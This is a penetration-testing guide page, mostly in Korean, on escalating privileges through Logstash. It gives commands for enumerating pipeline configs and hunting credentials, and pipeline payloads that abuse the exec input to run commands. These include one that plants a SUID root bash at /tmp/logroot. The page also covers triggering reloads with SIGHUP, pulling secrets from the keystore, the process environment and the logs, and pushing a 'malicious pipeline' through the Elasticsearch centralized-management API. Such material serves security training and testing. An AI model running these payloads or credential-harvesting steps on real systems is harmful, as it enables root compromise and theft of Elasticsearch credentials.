# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash는 **로그를 수집, 변환 및 전송**하기 위해 **pipelines**로 알려진 시스템을 통해 사용됩니다. 이러한 **pipelines**는 **input**, **filter**, 및 **output** 단계로 구성됩니다. Logstash가 침해된 시스템에서 동작할 때 흥미로운 측면이 발생합니다.

### Pipeline Configuration

Pipelines는 **/etc/logstash/pipelines.yml** 파일에서 구성되며, 이 파일은 pipeline 구성의 위치를 나열합니다:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
이 파일은 파이프라인 구성 파일인 **.conf** 파일들이 어디에 있는지 보여줍니다. When employing an **Elasticsearch output module**, it's common for **pipelines** to include **Elasticsearch credentials**, which often possess extensive privileges due to Logstash's need to write data to Elasticsearch. 와일드카드(Wildcards)는 구성 경로에서 Logstash가 지정된 디렉터리에서 일치하는 모든 파이프라인을 실행하도록 허용합니다.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. 이는 공격 측면에서 다음 두 가지 함의를 만듭니다:

- 공격자가 추가한 `000-input.conf` 또는 `zzz-output.conf` 같은 파일이 최종 파이프라인 구성 방식을 변경할 수 있습니다
- 형식이 잘못된 파일은 전체 파이프라인 로드를 방해할 수 있으므로 auto-reload에 의존하기 전에 payloads를 신중히 검증하세요

### 침해된 호스트에서 빠르게 열거하기

Logstash가 설치된 시스템에서는 빠르게 다음을 점검하세요:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
또한 로컬 모니터링 API에 접근 가능한지 확인하세요. 기본적으로 **127.0.0.1:9600**에 바인딩되어 있으며, 호스트에 진입한 이후에는 보통 이로 충분합니다:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
이렇게 하면 일반적으로 파이프라인 ID, 런타임 상세정보, 그리고 수정한 파이프라인이 로드되었다는 확인을 얻을 수 있습니다.

Logstash에서 복구한 자격 증명은 흔히 **Elasticsearch**의 접근을 허용하므로, [Elasticsearch에 관한 이 다른 페이지](../../network-services-pentesting/9200-pentesting-elasticsearch.md)를 확인하세요.

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, 먼저 Logstash 서비스가 어떤 사용자로 실행되는지 확인하세요(일반적으로 **logstash** 사용자). 다음 조건 중 **하나**를 충족해야 합니다:

- 파이프라인 **.conf** 파일에 대한 **쓰기 권한**을 가지고 있거나
- **/etc/logstash/pipelines.yml** 파일이 와일드카드를 사용하고 있고 대상 폴더에 쓸 수 있는 경우

추가로, 다음 조건 중 **하나**가 충족되어야 합니다:

- Logstash 서비스를 재시작할 수 있는 권한이 있거나
- **/etc/logstash/logstash.yml** 파일에 **config.reload.automatic: true**가 설정되어 있는 경우

구성에 와일드카드가 있을 경우, 이 와일드카드와 일치하는 파일을 생성하면 명령 실행이 가능합니다. 예를 들면:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
여기서, **interval**은 실행 빈도를 초 단위로 결정합니다. 예제에서 **whoami** 명령은 120초마다 실행되며 그 출력은 **/tmp/output.log**로 향합니다.

**/etc/logstash/logstash.yml**에 **config.reload.automatic: true**가 설정되어 있으면 Logstash는 재시작 없이 새 또는 수정된 파이프라인 구성을 자동으로 감지하고 적용합니다. 와일드카드가 없더라도 기존 구성은 수정할 수 있지만, 중단을 피하기 위해 주의해야 합니다.

### 더 신뢰할 수 있는 Pipeline Payloads

`exec` input plugin은 최신 릴리스에서도 여전히 작동하며 `interval` 또는 `schedule` 중 하나를 필요로 합니다. 이 플러그인은 Logstash JVM을 **포크(fork)** 하여 실행되므로 메모리가 부족한 경우 페이로드가 조용히 실행되는 대신 `ENOMEM`으로 실패할 수 있습니다.

보다 실용적인 privilege-escalation payload는 보통 지속적인 아티팩트를 남기는 경우가 많습니다:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
재시작 권한이 없지만 프로세스에 신호를 보낼 수 있다면, Logstash는 Unix 계열 시스템에서 **SIGHUP**으로 트리거되는 재로드도 지원합니다:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.

### Logstash에서 비밀 훔치기

코드 실행에만 집중하기 전에, Logstash가 이미 접근할 수 있는 데이터를 수집하라:

- 일반적으로 평문 자격증명은 `elasticsearch {}` 출력, `http_poller`, JDBC inputs, 또는 클라우드 관련 설정에 하드코딩되어 있는 경우가 많다
- 보안 설정은 **`/etc/logstash/logstash.keystore`** 또는 다른 `path.settings` 디렉터리에 있을 수 있다
- keystore 비밀번호는 종종 **`LOGSTASH_KEYSTORE_PASS`**를 통해 제공되며, 패키지 기반 설치는 일반적으로 **`/etc/sysconfig/logstash`**에서 이를 가져온다
- `${VAR}` 형식의 환경 변수 확장은 Logstash 시작 시에 해결되므로 서비스 환경을 확인해볼 가치가 있다

유용한 확인 항목:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
이 부분도 확인할 가치가 있습니다. **CVE-2023-46672**는 특정 상황에서 Logstash가 로그에 민감한 정보를 기록할 수 있음을 보여주었습니다. post-exploitation 호스트에서는 오래된 Logstash 로그와 `journald` 항목이 현재 구성(config)이 secrets를 inline으로 저장하는 대신 keystore를 참조하더라도 자격 증명을 노출할 수 있습니다.

### 중앙 집중식 파이프라인 관리 오용

일부 환경에서는 호스트가 로컬 `.conf` 파일에 전혀 의존하지 않습니다. **`xpack.management.enabled: true`**가 구성되어 있으면 Logstash는 Elasticsearch/Kibana에서 중앙 관리되는 파이프라인을 가져올 수 있으며, 이 모드를 활성화하면 로컬 파이프라인 구성은 더 이상 진실의 출처가 아닙니다.

이는 다른 공격 경로를 의미합니다:

1. 로컬 Logstash 설정, keystore 또는 로그에서 Elastic 자격 증명을 복구
2. 해당 계정에 **`manage_logstash_pipelines`** 클러스터 권한이 있는지 확인
3. 중앙에서 관리되는 파이프라인을 생성하거나 교체하여 Logstash 호스트가 다음 폴링 간격에서 페이로드를 실행하도록 함

이 기능에 사용되는 Elasticsearch API는:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
로컬 파일이 읽기 전용이지만 Logstash가 이미 원격에서 파이프라인을 가져오도록 등록되어 있는 경우에 특히 유용합니다.

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
